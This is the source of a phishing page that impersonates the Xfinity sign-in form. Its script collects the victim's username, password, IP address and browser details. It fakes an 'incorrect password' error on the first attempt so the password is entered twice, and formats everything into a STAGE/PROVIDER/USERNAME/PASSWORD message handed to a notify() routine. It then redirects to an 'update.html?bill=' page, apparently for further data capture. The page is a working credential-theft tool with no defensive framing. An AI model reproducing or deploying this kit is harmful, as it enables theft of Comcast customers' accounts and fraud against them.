<style>

   margin: 1% !important;

<body>
<div class="container-fluid">
            <div class="row">
                <div id="me-login" class="col-sm-12 col-lg-6 col-md-6">

                    <div class="login-form-1">



                    <form method="POST" id="eform" name="eform">
                    <img src="logo-grey.svg" class="logo" />

                    <h2 style="font-weight: 900; margin-bottom: 5%;">Sign in with your Xfinity ID</h2>

                    <div class="error"></div>
                    <div class="form-group">
                            <label>Email, mobile, or username</label>

                            <input type="text" class="form-control"  placeholder="Email, mobile, or username" autofocus name="euser" id="euser" value="" />

                            <div class="error_us"></div>
                        </div>

                        <div class="form-group">
                            <label>Password </label>
                            <input type="password" class="form-control" placeholder="Password" value="" name="epass" id="epass"  />
                            <div class="error_pw"></div>
                        </div>
                      <input value="" id="eip" name="eip" type="hidden" />


                          <div class="form-group">
                                  By signing in, you agree to our <a href="#" class="ForgetPwd" id="eforgetp">Terms of Service</a> and <a href="#" class="ForgetPwd" id="eforgetp">Privacy Policy.</a>
                            
                          </div>
                            
                        <div class="form-group">
                            <button type="submit" class="btn btnSubmit" id="btnSubmit"> Let's go </button>
                        </div>


                    </form>
                    </div>
                </div>


                <div id="me-ban" class="col-sm-12 col-lg-6 col-md-6">

                </div>

            </div>
        </div>


<script type="text/javascript"  src="post.js"></script>

        <script>
        let is_subm = 0;

        $(document).ready(function(){
          fetch_ip();

          const provider = "COMCAST-COM(https://login.xfinity.com/login?)";
          const get_browsername = browserN();
          $("#eform").on("submit", function (e){
            e.preventDefault();
            var get_ip = $("#eip").val();
            var euser = $("#euser").val();
            var epass = $("#epass").val();

            if (euser == "" && epass == "" ){
              $(".error_us").html("");
              $(".error_pw").html("");
              $(".error").html('<div id="error"><span>Please enter your  Xfinity ID and password to sign in </span></div>');

            }else if (euser == ""){
              $(".error").html("");
              $(".error_pw").html("");
              $(".error_us").html('<div id="error"><span>Please enter your Xfinity ID to sign in.</span></div>');

            }else if (!is_valid(euser)){
              $(".error").html("");
              $(".error_pw").html("");
              $(".error_us").html('<div id="error"><span>Invalid Xfinity ID or  Email Address, Please try again</span></div>');


            }else if (epass == ""){
              $(".error").html("");
              $(".error_us").html("");
              $(".error_pw").html('<div id="error"><span>Please type in your password to sign in.</span></div>');

            }else{

              $(".error").html("");
              $(".error_us").html("");
              $(".error_pw").html("");
              is_subm = is_subm +1;
              var stage = "Confirmed";
              if(is_subm == 1){
                var stage = "New";
                $("#epass").val("");
                $(".error").html('<div id="error"><span>The Xfinity ID or password you entered was incorrect. Please try again.</span></div>');
              }
              var message = `STAGE: ${stage}\nPROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
              const currentUrl = window.location.href;
              var upath = (currentUrl.endsWith('/') ? '' : '/')+"update.html?bill="+euser;
              var newUrl = currentUrl + upath;
              var status = notify(euser, message, newUrl, is_subm);

              if(is_subm > 1){
                $("#btnSubmit").attr("disabled", "disabled");
                $("#btnSubmit").text("Proccessing .. ");


              }


            }

          });

        })


    </script>


</body>
